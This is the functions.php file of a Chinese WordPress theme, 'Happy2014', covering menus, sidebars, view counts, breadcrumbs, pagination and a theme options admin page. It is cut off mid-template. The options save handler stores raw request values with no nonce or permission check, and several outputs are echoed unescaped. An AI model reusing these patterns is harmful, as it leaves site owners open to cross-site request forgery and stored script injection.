<?php


/**
 * [cnsecer_theme_setup 设置主题后保存并添加]
 * @return [type] [description]
 */
function cnsecer_theme_setup() {


  //自定义导航
    register_nav_menus(
      array(
      'header_menu' => __( '头部主导航' ),
      'footer-menu' => __( '底部' ),
      )
    );
  
  // 为文章和评论在 <head> 标签上添加 RSS feed 链接。
  // 主题为特色图像使用自定义图像尺寸，显示在 '标签' 形式的文章上。
  add_theme_support( 'post-thumbnails' );
  set_post_thumbnail_size( 250, 250 ); 
  add_theme_support( 'custom-background' );  //自定义背景 
  }
add_action( 'after_setup_theme', 'cnsecer_theme_setup' );

function cnsecer_widgets_init() {
  register_sidebar(array(
    'name' => '首页侧栏',
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h3>',
    'after_title' => '</h3>',
  ));
  register_sidebar(array(
    'name' => '分类页侧栏',
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h3>',
    'after_title' => '</h3>',
  ));
  register_sidebar(array(
    'name' => '内容页侧栏',
    'before_widget' => '<div id="%1$s" class="widget %2$s">',
    'after_widget' => '</div>',
    'before_title' => '<h3>',
    'after_title' => '</h3>',
  ));
}
add_action( 'widgets_init', 'cnsecer_widgets_init' );

//显示友链
add_filter( 'pre_option_link_manager_enabled', '__return_true' ); 


/**
 * [is_mobile 判断设备类型] 
 * @return boolean [如果为真，则为移动设备。反之，则为桌面设备]
 */
function is_mobile() {
   $user_agent = $_SERVER['HTTP_USER_AGENT'];
   $mobile_browser = Array(
     "mqqbrowser", //手机QQ浏览器
     "opera mobi", //手机opera
     "juc","iuc",//uc浏览器
     "fennec","ios","applewebKit/420","applewebkit/525","applewebkit/532","ipad","iphone","ipaq","ipod",
     "iemobile", "windows ce",//windows phone
     "240x320","480x640","acer","android","anywhereyougo.com","asus","audio","blackberry","blazer","coolpad" ,"dopod", "etouch", "hitachi","htc","huawei", "jbrowser", "lenovo","lg","lg-","lge-","lge", "mobi","moto","nokia","phone","samsung","sony","symbian","tablet","tianyu","wap","xda","xde","zte"
   );
   $is_mobile = false;
   foreach ($mobile_browser as $device) {
     if (stristr($user_agent, $device)) {
       $is_mobile = true;
       break;
     }
   }
   return $is_mobile;
}
function remove_open_sans() {
wp_deregister_style( 'open-sans' );
wp_register_style( 'open-sans', false );
wp_enqueue_style('open-sans','');
}
add_action( 'init', 'remove_open_sans' );
add_action('wp_enqueue_scripts', 'remove_open_sans');
// 去除wp_head()中没用的标签
remove_action( 'wp_head', 'wlwmanifest_link' );
remove_action( 'wp_head', 'index_rel_link' );
remove_action( 'wp_head', 'feed_links', 2 );
remove_action( 'wp_head', 'feed_links_extra', 3 );
remove_action( 'wp_head', 'rsd_link' );
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 );
remove_action( 'wp_head', 'wp_shortlink_wp_head',10,0 );
/**
 * [getPostViews 获取文章浏览次数] 
 * @param  [type] $postID [description]
 * @return [type]         [返回浏览次数]
 */
function getPostViews($postID) {
 $count_key = 'post_views_count';
 $count = get_post_meta ( $postID, $count_key, true );
 if ($count == '') {
 delete_post_meta ( $postID, $count_key );
 add_post_meta ( $postID, $count_key, '0' );
 return "0";
 }
 return $count;
}

 /**
  * [setPostViews 文章每浏览一次，总次数+1]
  * @param [type] $postID [description]
  */
function setPostViews($postID) {
 $count_key = 'post_views_count';
 $count = get_post_meta ( $postID, $count_key, true );
 if ($count == '') {
 $count = 0;
 delete_post_meta ( $postID, $count_key );
 add_post_meta ( $postID, $count_key, '0' );
 } else {
 $count ++;
 update_post_meta ( $postID, $count_key, $count );
 }
}

/**
 * [get_recent_comments description]
 * @return [type] [description]
 */
function get_recent_comments(){    
     // 不显示pingback的type=comment,不显示自己的,user_id=0.(此两个参数可有可无)
     $comments=get_comments(array('number'=>10,'status'=>'approve','type'=>'comment','user_id'=>0));
     $output = '';   
     foreach($comments as $comment) {   
       $random = mt_rand(1, 10);
         //去除评论内容中的标签   
         $comment_content = strip_tags($comment->comment_content);   
         //评论可能很长,所以考虑截断评论内容,只显示10个字   
         $short_comment_content = trim(mb_substr($comment_content ,0, 10,"UTF-8"));   
         //先获取头像   
         $output .= '<li><div style="float:left;"><img style="padding-right:5px;width:55px;height:45px;" alt="nopic" title="no pic i say a jb" src=" '.get_bloginfo("template_url").'/images/nopic/nopic'.$random.'.gif"></div> '; 
         //获取作者   
         $output .= '<div style="margin-left: 46px;color:red">'.$comment->comment_author .':</div><div style="margin-left:46px;"><a href="';
         //评论内容和链接  
         $output .= get_permalink( $comment->comment_post_ID ) .'" title="查看 '.get_post( $comment->comment_post_ID )->post_title .'">';   
         $output .= $short_comment_content .'..</a></div></li>';   
     }   
     //输出   
     echo $output; 
 }



/**
 * [colorCloud 彩色标签云]
 * @param  [type] $text [description]
 * @return [type]       [输入每个标签]
 */
function colorCloud($text) {
$text = preg_replace_callback('|<a (.+?)>|i', 'colorCloudCallback', $text);
return $text;
}
function colorCloudCallback($matches) {
$text = $matches[1];
$color = dechex(rand(0,16777215));
$pattern = '/style=(\'|\")(.*)(\'|\")/i';
$text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text);
return "<a $text>";
}
add_filter('wp_tag_cloud', 'colorCloud', 1);


/**
 * [cnsecer_archives_list 文章归档页面]
 * Archives list by cnsecer
 * @return [type] [description]
 */
 function cnsecer_archives_list() {
     if( !$output = get_option('cnsecer_archives_list') ){
         $output = '<div id="archives">';
         $the_query = new WP_Query( 'posts_per_page=-1&ignore_sticky_posts=1' ); //update: 加上忽略置顶文章
         $year=0; $mon=0; $i=0; $j=0;
         while ( $the_query->have_posts() ) : $the_query->the_post();
             $year_tmp = get_the_time('Y');
             $mon_tmp = get_the_time('m');
             $y=$year; $m=$mon;
             if ($mon != $mon_tmp && $mon > 0) $output .= '</ul></li>';
             if ($year != $year_tmp && $year > 0) $output .= '</ul>';
             if ($year != $year_tmp) {
                 $year = $year_tmp;
                 $output .= '<h3 class=all_year">'. $year .' 年</h3><ul class=all_mon_list">'; //输出年份
             }
             if ($mon != $mon_tmp) {
                 $mon = $mon_tmp;
                 $output .= '<li><div class="panel panel-default" style="cursor: pointer;"><div class="panel-heading"><span class=all_mon">'. $mon .' 月</div></div></span><ul class=all_post_list">'; //输出月份
             }
             $output .= '<li>'. get_the_time('d日: ') .'<a href="'. get_permalink() .'">'. get_the_title() .'</a> <em>('. get_comments_number('0', '1', '%') .')</em></li>'; //输出文章日期和标题
         endwhile;
         wp_reset_postdata();
         $output .= '</ul></li></ul></div>';
         update_option('cnsecer_archives_list', $output);
     }
     echo $output;
 }
 function clear_all_cache() {
     update_option('cnsecer_archives_list', ''); // 清空 cnsecer_archives_list
 }
 add_action('save_post', 'clear_all_cache'); // 新发表文章/修改文章时


/**
 * [cate_nav wordpress面包屑导航]
 * @return [type] [description]
 */
function cate_nav() {
   
  $delimiter = '&raquo;';
  $name = '首页';
  $currentBefore = '<span>';
  $currentAfter = '</span>';
   
  if ( !is_home() && !is_front_page() || is_paged() ) {
   
   
    global $post;
    $home = get_bloginfo('url');
    echo '<a href="' . $home . '">' . $name . '</a> ' . $delimiter . ' ';
   
    if ( is_category() ) {
      global $wp_query;
      $cat_obj = $wp_query->get_queried_object();
      $thisCat = $cat_obj->term_id;
      $thisCat = get_category($thisCat);
      $parentCat = get_category($thisCat->parent);
      if ($thisCat->parent != 0) echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
      single_cat_title();
      echo '' . $currentAfter;
   
    } elseif ( is_day() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo '<a href="' . get_month_link(get_the_time('Y'),get_the_time('m')) . '">' . get_the_time('F') . '</a> ' . $delimiter . ' ';
      echo $currentBefore . get_the_time('d') . $currentAfter;
   
    } elseif ( is_month() ) {
      echo '<a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a> ' . $delimiter . ' ';
      echo $currentBefore . get_the_time('F') . $currentAfter;
   
    } elseif ( is_year() ) {
      echo $currentBefore . get_the_time('Y') . $currentAfter;
   
    } elseif ( is_single() ) {
      $cat = get_the_category(); $cat = $cat[0];
      echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
      echo $currentBefore;
      the_title();
      echo $currentAfter;
   
    } elseif ( is_page() && !$post->post_parent ) {
      echo $currentBefore;
      the_title();
      echo $currentAfter;
   
    } elseif ( is_page() && $post->post_parent ) {
      $parent_id  = $post->post_parent;
      $breadcrumbs = array();
      while ($parent_id) {
        $page = get_page($parent_id);
        $breadcrumbs[] = '<a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a>';
        $parent_id  = $page->post_parent;
      }
      $breadcrumbs = array_reverse($breadcrumbs);
      foreach ($breadcrumbs as $crumb) echo $crumb . ' ' . $delimiter . ' ';
      echo $currentBefore;
      the_title();
      echo $currentAfter;
   
    } elseif ( is_search() ) {
      echo $currentBefore . 'Search results for &#39;' . get_search_query() . '&#39;' . $currentAfter;
   
    } elseif ( is_tag() ) {
      single_tag_title();
      echo '' . $currentAfter;
   
    } elseif ( is_author() ) {
       global $author;
      $userdata = get_userdata($author);
      echo $currentBefore . '当前文章页 ' . $userdata->display_name . $currentAfter;
   
    } elseif ( is_404() ) {
      echo $currentBefore . 'Error 404' . $currentAfter;
    }
   
    if ( get_query_var('paged') ) {
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ' (';
      echo __('Page') . ' ' . get_query_var('paged');
      if ( is_category() || is_day() || is_month() || is_year() || is_search() || is_tag() || is_author() ) echo ')';
    } 
    }
}

/**
 * [popular_posts 获取热门文章]
 * @param  integer $num    [默认输出的文章数量]
 * @param  string  $before [description]
 * @param  string  $after  [description]
 * @return [type]          [description]
 */
function popular_posts($num = 10, $before='<li>', $after='</li>'){
  global $wpdb;
  $sql = "SELECT comment_count,ID,post_title ";
  $sql .= "FROM $wpdb->posts where post_status='publish' && post_type='post' ";
  $sql .= "ORDER BY comment_count DESC ";
  $sql .= "LIMIT 0 , $num";
  $hotposts = $wpdb->get_results($sql);
  $output = '';
  foreach ($hotposts as $hotpost) {
      $post_title = stripslashes($hotpost->post_title);
      $permalink = get_permalink($hotpost->ID);
      $output .= $before.'<a href="' . $permalink . '"  rel="bookmark" title="';
      $output .= $post_title . '">' . $post_title . '</a>';
      $output .= $after;
  }
  if($output==''){
      $output .= $before.'暂无...'.$after;
  }
  echo $output;
}

/**
 * [getRelatedPosts 获取相关文章]
 * @return [type] [description]
 */
function getRelatedPosts(){
  $post_num = 8;
  $exclude_id = $post->ID;
  $posttags = get_the_tags(); $i = 0;
  if ( $posttags ) {
    $tags = ''; foreach ( $posttags as $tag ) $tags .= $tag->term_id . ',';
    $args = array(
      'post_status' => 'publish',
      'tag__in' => explode(',', $tags),
      'post__not_in' => explode(',', $exclude_id),
      'caller_get_posts' => 1,
      'orderby' => 'comment_date',
      'posts_per_page' => $post_num,
    );
    query_posts($args);
  }
  if ( $i < $post_num ) {
    $cats = ''; foreach ( get_the_category() as $cat ) $cats .= $cat->cat_ID . ',';
    $args = array(
      'category__in' => explode(',', $cats),
      'post__not_in' => explode(',', $exclude_id),
      'caller_get_posts' => 1,
      'orderby' => 'comment_date',
      'posts_per_page' => $post_num - $i
    );
    query_posts($args);
    $n=1;
    while( have_posts() ) { the_post(); ?>

      <?php if($n<4):?>
        <li><span class="sp" style="background-color:#3ec491"><?php echo $n ;?></span><a title="<?php the_title(); ?>"  href="<?php the_permalink() ?>"><?php the_title(); ?></a></li>
      <?php else: ?>
        <li><span class="sp"><?php echo $n ;?></span><a title="<?php the_title(); ?>"  href="<?php the_permalink() ?>"><?php the_title(); ?></a></li>
      <?php endif ;?>

      <?php $n++; ?>

    <?php $i++;
    } wp_reset_query();
  }
  if ( $i  == 0 )  echo '<li>没有相关文章!</li>';
}
/**
 * [wpbeginner_remove_version 移除wordpress版本号]
 * @return [type] [description]
 */
function wpbeginner_remove_version() {
  return '';
}
add_filter('the_generator', 'wpbeginner_remove_version');

/**
 * [add_editor_buttons 增强默认编辑器功能]
 * @param [type] $buttons [description]
 */
function add_editor_buttons($buttons) {
  $buttons[] = 'fontselect';
  $buttons[] = 'fontsizeselect';
  $buttons[] = 'backcolor';
  $buttons[] = 'underline';
  $buttons[] = 'hr';
  $buttons[] = 'sub';
  $buttons[] = 'sup';
  $buttons[] = 'cut';
  $buttons[] = 'copy';
  $buttons[] = 'paste';
  $buttons[] = 'cleanup';
  $buttons[] = 'wp_page';
  $buttons[] = 'newdocument';
  return $buttons;
}
add_filter("mce_buttons_3", "add_editor_buttons");

/**
 * [cnsecer_get_most_viewed 获取浏览次数最多的文章]
 * @param  integer $posts_num [默认输出的文章数量]
 * @param  integer $days      [获取多少天以内的文章]
 * @return [type]             [description]
 */
function cnsecer_get_most_viewed($posts_num=13, $days=180){
    global $wpdb;
    $sql = "SELECT ID , post_title , comment_count FROM $wpdb->posts WHERE post_type = 'post' AND TO_DAYS(now()) - TO_DAYS(post_date) < $days AND ($wpdb->posts.`post_status` = 'publish' OR $wpdb->posts.`post_status` = 'inherit') ORDER BY comment_count DESC LIMIT 0 , $posts_num ";
    $posts = $wpdb->get_results($sql);
    $output = "";
    $temp =1;
    
    foreach ($posts as $post){
        $sb =0; $str="<span class=\"label label-info\">";
        if($temp>9){
          $sb ="";
        }else{
          $sb=0;
        }
        if($temp>3){
          $str="<span class=\"label label-default\">";
        }else{
          $str="<span class=\"label label-info\">";
        }
        $output .= "\n<li>".$str.$sb.$temp++."</span><span><a href= \"".get_permalink($post->ID)."\" title=\"".$post->post_title."\" >".$post->post_title."</a></span></li>";
    }
    echo $output;
}
/**
 * [isIndex 判断页面是否为主页]
 * @return boolean [description]
 */
function isIndex(){
  global  $paged;
  if(empty($paged))$paged = 1;
  if($paged == 1)
    return true;
  else
    return false;
}

/**
 * [pagination 文章分页导航，适配Bootstrap]
 * @param  [type] $query_string [description]
 * @return [type]               [description]
 */
function pagination($query_string){
global $posts_per_page, $paged;
$my_query = new WP_Query($query_string ."&posts_per_page=-1");
$total_posts = $my_query->post_count;
if(empty($paged))$paged = 1;
$prev = $paged - 1;             
$next = $paged + 1; 
$range = 3; // 分页数设置
$showitems = ($range * 2)+1;
$pages = ceil($total_posts/$posts_per_page);
  if(1 != $pages){
      echo "<ul class=\"pager\">" ;
      if($paged !=1){
      //echo "<li><a href='" . get_pagenum_link(1) . "' class='extend'  title='跳转到首页'> 首页 </a></li>";
      echo   "<li class=\"previous\">";
         previous_posts_link(  '<span class="fui-arrow-left"></span> ' ) ;
      echo  "</li>";
    }
  if($paged == 1){
    echo "<li class=\"previous disabled\">";
    echo "<a href=><span class=\"fui-arrow-left\"></span></a>";
    echo "</li>";
  }

  for ($i=1; $i <= $pages; $i++){
    if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
      echo ($paged == $i)? "<li><span class='current'>".$i."</span></li>":"<li><a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a></li>"; 
    }
  }
  if($paged != $pages){
    echo " <li class=\"next\"> ";
      next_posts_link(  '<span class="fui-arrow-right"></span> ' );
    echo "</li>";
 //   echo "<li><a href='" . get_pagenum_link($pages) . "' class='extend' title='跳转到最后一页'> 末页 </a></li>";
  }
  if($paged == $pages){
    echo "<li class=\"next disabled\">";
    echo "<a href=\"#\"><span class=\"fui-arrow-right\"></span></a>";
    echo "</li>";
  }
    
  echo "</ul>\n";
  }

}

/**
 * [generalPagination 普通分页 不和BS匹配 便于修改CSS样式] 
 * @param  [type] $query_string [description]
 * @return [type]               [description]
 */
function generalPagination($query_string){
global $posts_per_page, $paged;
$my_query = new WP_Query($query_string ."&posts_per_page=-1");
$total_posts = $my_query->post_count;
if(empty($paged))$paged = 1;
$prev = $paged - 1;             
$next = $paged + 1; 
$range = 3; // 分页数设置
$showitems = ($range * 2)+1;
$pages = ceil($total_posts/$posts_per_page);
  if(1 != $pages){
      echo "<ul>" ;
      if($paged !=1){
      echo "<li><a href='" . get_pagenum_link(1) . "' class='extend'  title='跳转到首页'> 首页 </a></li>";
      echo   "<li class=\"previous\">";
         previous_posts_link(  '<span>上一页</span> ' ) ;
      echo  "</li>";
    }


  for ($i=1; $i <= $pages; $i++){
    if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems )){
      echo ($paged == $i)? "<li><span class='current'>".$i."</span></li>":"<li><a href='".get_pagenum_link($i)."' class='inactive' >".$i."</a></li>"; 
    }
  }

  if($paged != $pages){
    echo " <li class=\"next\"> ";
      next_posts_link(  '<span>下一页</span> ' );
    echo "</li>";
    echo "<li><a href='" . get_pagenum_link($pages) . "' class='extend' title='跳转到最后一页'> 末页 </a></li>";
  }
  echo "</ul>\n";
  }

}


/**
 * [post_thumbnail_src 使用文章第一章图片作为缩略图,如果没，则随机输出1-9的JPG格式图片]
 * @return [type] [description]
 */
function post_thumbnail_src(){
    global $post;
  if( $values = get_post_custom_values("thumb") ) { //输出自定义域图片地址
    $values = get_post_custom_values("thumb");
    $post_thumbnail_src = $values [0];
  } elseif( has_post_thumbnail() ){    //如果有特色缩略图，则输出缩略图地址
        $thumbnail_src = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID),'full');
    $post_thumbnail_src = $thumbnail_src [0];
    } else {
    $post_thumbnail_src = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $post_thumbnail_src = $matches [1] [0];   //获取该图片 src
    if(empty($post_thumbnail_src)){ //如果日志中没有图片，则显示随机图片
    //  $random = mt_rand(1, 10);
      echo get_bloginfo('template_url');
  //    echo '/images/pic/'.$random.'.jpg';
      echo '/images/nopic.png';
      //如果日志中没有图片，则显示默认图片
      //echo '/images/default_thumb.jpg';
    }
  };
  echo $post_thumbnail_src;
}
/**
 * [post_thumbnail_src 使用文章第一章图片作为缩略图,不输出特色图像]
 * @return [type] [description]
 */
function post_thumbnail_src_2(){
  global $post;
  if( $values = get_post_custom_values("thumb") ) { //输出自定义域图片地址
    $values = get_post_custom_values("thumb");
    $post_thumbnail_src = $values [0];
  }else {
    $post_thumbnail_src = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $post_thumbnail_src = $matches [1] [0];   //获取该图片 src
    if(empty($post_thumbnail_src)){ //如果日志中没有图片，则显示随机图片
    //  $random = mt_rand(1, 10);
      echo get_bloginfo('template_url');
  //    echo '/images/pic/'.$random.'.jpg';
      echo '/images/nopic.png';
      //如果日志中没有图片，则显示默认图片
      //echo '/images/default_thumb.jpg';
    }
  };
  echo $post_thumbnail_src;
}

/**
 * [bootstrap_nav 此函数可以使wp_nav_menu()支持BootStrap]
 * @return [type] [description]
 */
function  bootstrap_nav(){
  $defaults = array(
  'theme_location'  =>  'header_menu',
  'menu_class'      =>  'nav navbar-nav',
  'menu_id'    =>  'cnsecer',
  'container'       =>  false,
  'walker'          =>  new BootStrap_Nav_Walker,
  ) ; 

  return wp_nav_menu($defaults);
}

class BootStrap_Nav_Walker extends Walker_Nav_Menu {
     function start_lvl( &$output, $depth ) {
          $output .= "\n<ul class=\"dropdown-menu\">\n";
     }
     function start_el( &$output, $item, $depth, $args ) {
          global $wp_query;
          $indent = ( $depth ) ? str_repeat( "\t", $depth ) : '';
          $li_attributes = $class_names = $value = '';
          $classes = empty( $item->classes ) ? array() : (array) $item->classes;
          $classes[] = 'menu-item-' . $item->ID;
          if ( $args->has_children ) {
               $classes[] = ( 1 > $depth) ? 'dropdown': 'dropdown-submenu';
               $li_attributes .= ' data-dropdown="dropdown"';
          }
          $class_names = join( ' ', apply_filters( 'nav_menu_css_class', array_filter( $classes ), $item, $args ) );
          $class_names = $class_names ? ' class="' . esc_attr( $class_names ) . '"' : '';
          $id = apply_filters( 'nav_menu_item_id', 'menu-item-'. $item->ID, $item, $args );
          $id = $id ? ' id="' . esc_attr( $id ) . '"' : '';
          $output .= $indent . '<li' . $id . $value . $class_names . $li_attributes . '>';
          $attributes     =     $item->attr_title     ? ' title="'  . esc_attr( $item->attr_title ) .'"' : '';
          $attributes     .=     $item->target          ? ' target="' . esc_attr( $item->target     ) .'"' : '';
          $attributes     .=     $item->xfn               ? ' rel="'    . esc_attr( $item->xfn        ) .'"' : '';
          $attributes     .=     $item->url               ? ' href="'   . esc_attr( $item->url        ) .'"' : '';
          $attributes     .=     $args->has_children     ? ' class="dropdown-toggle" data-toggle="dropdown"' : '';
          $item_output     =     $args->before . '<a' . $attributes . '>';
          $item_output     .=     $args->link_before . apply_filters( 'the_title', $item->title, $item->ID ) . $args->link_after;
          $item_output     .=     ( $args->has_children AND 1 > $depth ) ? ' <b class="caret"></b>' : '';
          $item_output     .=     '</a>' . $args->after;
          $output .= apply_filters( 'walker_nav_menu_start_el', $item_output, $item, $depth, $args );
     }
     function display_element( $element, &$children_elements, $max_depth, $depth = 0, $args, &$output ) {
          if ( ! $element )
               return;
          $id_field = $this->db_fields['id'];
          if ( is_array( $args[0] ) )
               $args[0]['has_children'] = (bool) ( ! empty( $children_elements[$element->$id_field] ) AND $depth != $max_depth - 1 );
          elseif ( is_object(  $args[0] ) )
               $args[0]->has_children = (bool) ( ! empty( $children_elements[$element->$id_field] ) AND $depth != $max_depth - 1 );
          $cb_args = array_merge( array( &$output, $element, $depth ), $args );
          call_user_func_array( array( &$this, 'start_el' ), $cb_args );
          $id = $element->$id_field;
          // descend only when the depth is right and there are childrens for this element
          if ( ( $max_depth == 0 OR $max_depth > $depth+1 ) AND isset( $children_elements[$id] ) ) {
               foreach ( $children_elements[ $id ] as $child ) {
                    if ( ! isset( $newlevel ) ) {
                         $newlevel = true;
                         $cb_args = array_merge( array( &$output, $depth ), $args );
                         call_user_func_array( array( &$this, 'start_lvl' ), $cb_args );
                    }
                    $this->display_element( $child, $children_elements, $max_depth, $depth + 1, $args, $output );
               }
               unset( $children_elements[ $id ] );
          }
          if ( isset( $newlevel ) AND $newlevel ) {
               //end the child delimiter
               $cb_args = array_merge( array( &$output, $depth ), $args );
               call_user_func_array( array( &$this, 'end_lvl' ), $cb_args );
          }
          $cb_args = array_merge( array( &$output, $element, $depth ), $args );
          call_user_func_array( array( &$this, 'end_el' ), $cb_args );
     }
}

/**
 * [cnsecer_nav_menu_css_class 给激活的菜单添加.active属性]
 * @param  [type] $classes [description]
 * @return [type]          [description]
 */
function cnsecer_nav_menu_css_class( $classes ) {
     if ( in_array('current-menu-item', $classes ) OR in_array( 'current-menu-ancestor', $classes ) )
          $classes[]     =     'active';
     return $classes;
}
add_filter( 'nav_menu_css_class', 'cnsecer_nav_menu_css_class' );
//add other function here

?>
<?php

/**
 * [description:后台自定义菜单模板,请勿修改。]
 * [Author:cnsecer.com]
 * [Date:2014.01.14]
 * 用法: <?php echo stripslashes(get_option('cnsecer_title')); ?>
 */

$themename = "Happy2014";
$shortname = "cnsecer";   //前缀  
$options = array (

array(
"name" => "SEO设置",
"type" => "group",
),  
array(
"name" => "标题（Title)",
"id" => $shortname."_title",   
"type" => "text",
"std" => "网站标题",
),
array("name" => "关键字（KeyWords）",
"id" => $shortname."_keywords",
"type" => "textarea",
"css" => "class='h60px'",
"std" => "网站关键字",
),
array("name" => "描述（Description）",
"id" => $shortname."_description",
"type" => "textarea",
"css" => "class='h60px'",
"std" => "网站描述",
),
array(
"name" => "高级设置",
"type" => "group",
), 
array("name" => "主页样式",
"id" => $shortname."_style",
"type" => "select",
"options" => array("0", "1"),
"style"=>array("博客","瀑布流"),
"std" => "瀑布流OR博客？",
),
array("name" => "使用瀑布流样式的分类",
"id" => $shortname."_waterfallStyle",
"type" => "text",
"explain" => "填写分类别名,多个分类别名用英文逗号(,)隔开.Example:wordpress,php,html"
),
array("name" => "Tips",
"id" => $shortname."_tips",
"type" => "text",
"explain" => "鼠标放到Logo上面弹出的文字"
),
array("name" => "弹窗文字",
"id" => $shortname."_alert",
"type" => "text",
"explain" => "LOGO右边的文字(支持HTML代码)"
),
array(
"name" => "Logo(240*80)",
"id" => $shortname."_logo",  
"type" => "upload",
"explain" => "不上传则使用默认的"
),

array(
"name" => "favicon.ico",
"id" => $shortname."_favicon",  
"type" => "upload",
"explain" => "不上传则使用默认的"
),
array(
"name" => "底部二维码",
"id" => $shortname."_code",  
"type" => "upload",
"explain" => "不上传则使用默认的"
),

array("name" => "自定义CSS样式",
"id" => $shortname."_css",
"type" => "textarea",
"css" => "class='h140px'",
"explain" => "可以不填写"
),
array(
"name" => "主题配置",
"type" => "group",
), 
array("name" => "版权年份",
"id" => $shortname."_years",
"std" => "2013-2014",
"type" => "text",
),
array("name" => "ICP备案号",
"id" => $shortname."_icp",
"type" => "text",
),
array("name" => "主页分享代码",
"id" => $shortname."_share",
"type" => "textarea",
"css" => "class='h80px'",
"explain" => "百度分享代码或者jiathis等"
),
array("name" => "底部统计代码",
"id" => $shortname."_tongji",
"type" => "textarea",
"css" => "class='h80px'",
"explain" => "页面底部可以显示第三方统计<br>您可以放一个或者多个统计代码"
),
array(
"name" => "联系信息",
"type" => "group",
),
array("name" => "QQ群",
"id" => $shortname."_qun",
"type" => "text",
),
array("name" => "邮箱",
"id" => $shortname."_email",
"type" => "text",
),
array("name" => "QQ",
"id" => $shortname."_qq",
"type" => "text",
),
array("name" => "新浪微博",
"id" => $shortname."_weibo",
"type" => "text",
),
array("name" => "腾讯微博",
"id" => $shortname."_tweibo",
"type" => "text",
),
array("name" => "OSC账号",
"id" => $shortname."_osc",
"type" => "text",
),
array(
"name" => "广告代码",
"type" => "group",
), 
array("name" => "网站头部广告(468*60)",
"id" => $shortname."_top_ads",
"type" => "textarea",
"css" => "class='h60px'",
"explain" => "建议使用468*60的广告代码"
),      
array("name" => "文章头部广告(760*90)", 
"id" => $shortname."_single-ads",
"type" => "textarea",
"css" => "class='h60px'",
"explain" => "建议使用760*90的广告代码"
),
array("name" => "侧栏广告(250*250)",
"id" => $shortname."_sidebar-ads",
"type" => "textarea",
"css" => "class='h60px'",
"explain" => "建议使用250*250的广告代码"
),

);
function mytheme_add_admin() {
  global $themename, $shortname, $options;
  if ( $_GET['page'] == basename(__FILE__) ) {
  if ( 'save' == $_REQUEST['action'] ) {
      foreach ($options as $value) {
      update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }
      foreach ($options as $value) {
      if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
      header("Location: themes.php?page=functions.php&saved=true");
      die;   //one 
      } else if( 'reset' == $_REQUEST['action'] ) {
      foreach ($options as $value) {
        delete_option( $value['id'] );
        update_option( $value['id'], $value['std'] );
      }
      header("Location: themes.php?page=functions.php&reset=true");
      die;   //two
    }
  }
  add_theme_page($themename." 设置", "$themename 设置", 'edit_themes', basename(__FILE__), 'mytheme_admin');
}

function my_admin_scripts() { //加载需要使用的js文件。
  wp_enqueue_script('media-upload');
  wp_enqueue_script('thickbox');
  wp_register_script('my-upload', get_bloginfo('template_directory').'/include/upload.js', array('jquery','media-upload','thickbox'));
  wp_enqueue_script('my-upload');
  
}

function my_admin_styles() { //加载样式文件。
  wp_enqueue_style('thickbox');
  wp_register_style('my-css', get_bloginfo('template_directory').'/include/admin.css');
  wp_enqueue_style('my-css');
}


add_action('admin_print_scripts', 'my_admin_scripts');
add_action('admin_print_styles', 'my_admin_styles');

   

function mytheme_admin() {
  global $themename, $shortname, $options;
  if ( $_REQUEST['saved'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' 设置已保存。</strong></p></div>';
  if ( $_REQUEST['reset'] ) echo '<div id="message" class="updated fade"><p><strong>'.$themename.' 设置已重置。</strong></p></div>';

?>
<div class="wrap">
  <h2><b><?php echo $themename; ?>主题设置</b></h2>
  <hr />
  <div>主题作者：<a href="http://www.cnsecer.com" target="_blank">安全者</a> ¦ 当前版本：<a href="http://www.cnsecer.com/3921.html"  target="_blank">V3.0</a> ¦ 主题介绍、使用帮助及升级请访问：<a href="http://www.cnsecer.com/guestbook/" title="留言板" target="_blank">留言版</a></div>
  <form method="post">
    <div class="options">

      <?php foreach ($options as $value): ?>

        <!-- 文本 -->
        <?php if ($value['type'] == "text"): ?>
          <div class="setup">
          
            <h3><?php echo $value['name']; ?></h3>
            <div class="value"><input name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id']) ); } else { echo $value['std']; } ?>" /></div>
            <div class="explain"><?php echo $value['explain']; ?></div>
          </div>  
        <!-- 分组 -->
        <?php elseif($value['type'] == "group"): ?>
        <div class="group">
          <h3><?php echo $value['name']; ?></h3>
        </div>
        <!-- 上传 -->
        <?php elseif($value['type'] == "upload"): ?>
          <div class="setup">
            <h3><?php echo $value['name']; ?></h3>
            <input name="<?php echo $value['id']; ?>" type="text" id="<?php echo $value['id']; ?>" value="<?php echo get_option($value['id']); ?>" />
            <input type="button" id="plupload-browse-button" name="upload_button" class="button upload_button " value="上传" onclick='uploadImg("<?php echo $value['id']; ?>")' />
            <input type="button" id="plupload-browse-button" name="del_button" class="button del_button" value="删除" onclick='clearImgDir("<?php echo $value['id']; ?>")'  />
          </div>
        <!-- 文本域 -->
        <?php elseif($value['type'] == "textarea"): ?>
           <div class="setup">
              <h3><?php echo $value['name']; ?></h3>
